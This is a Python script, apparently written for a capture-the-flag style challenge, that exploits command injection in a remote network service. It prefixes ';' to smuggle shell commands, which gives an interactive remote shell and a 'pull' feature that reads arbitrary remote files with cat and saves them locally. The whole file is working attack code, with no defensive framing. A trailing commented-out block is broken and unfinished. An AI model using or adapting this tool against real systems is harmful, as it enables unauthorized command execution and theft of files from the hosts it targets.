import os
import socket
import time
host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here


	
def shell(): 

	while True:

		cmnd = input("> ")

		args = cmnd.split()

		if cmnd == 'quit':
			quit()

		elif cmnd == 'help':
			print("\nshell: Drop into an interactive shell and allow users to gracefully exit \
				   \npull <remote-path> <local-path>: Download files \
				   \nhelp: Shows this help menu \
				   \nquit: Quit the shell\n")

		elif (len(args) == 3) and (args[0] == 'pull'):

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			time.sleep(2)

			s.recv(1024)

			cmnd = "; cat " + args[1] + "\n"

			s.send(bytes(cmnd, 'utf-8'))
			output = s.recv(1024).decode('utf-8')

			if output.strip() == "":
				print("Error: invalid remote-path or file is empty")

			else: 

				try: 
					f = open(args[2], 'w')
					f.write(output)
					f.close()
				except: 
					print("Error: invalid local-path")


		elif cmnd == 'shell':
			cur_dir = "/"
			remote_shell_open = True

			while remote_shell_open == True:

				cmnd = ";cd " + cur_dir + "; " + input(cur_dir + "> ")

				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))
				time.sleep(2)

				s.recv(1024)

				if cmnd.split()[2] == "cd": #cd command

					cmnd += "; pwd"
					
					s.send(bytes((cmnd + "\n"), 'utf-8'))

					#after executing cd command, check current directory

					cur_dir = s.recv(1024).decode('utf-8').strip()

				
				elif cmnd.split()[2] == "exit": 
					remote_shell_open = False

				else:
					s.send(bytes((cmnd + "\n"), 'utf-8')) 
					output = s.recv(1024).decode('utf-8')

					if output.strip() != "":
						print(output.strip())

		else: 
			print("\nInvalid command. Try one of these:")
			print("\nshell: Drop into an interactive shell and allow users to gracefully exit \
				   \npull <remote-path> <local-path>: Download files \
				   \nhelp: Shows this help menu \
				   \nquit: Quit the shell\n")


if __name__ == '__main__':
	shell()


























'''
	if cmnd.split()[0] == "cd"

		dir = cmnd.split[1]

		cur_path_tmp = '/' + '/'.join(cur_path) + '/' + dir

		cmnd = "; if [ -d " + cur_path_temp + " ]; then echo valid; cd " + dir + "; fi"

		while s.recv(1024) == b'':
				wait(0)	

		s.send(bytes(cmnd, 'utf-8'))

		wait(.1)

		if s.recv(1024) == b'valid':

			curr_path.add(dir)

			curr_dir = ; 

'''



		
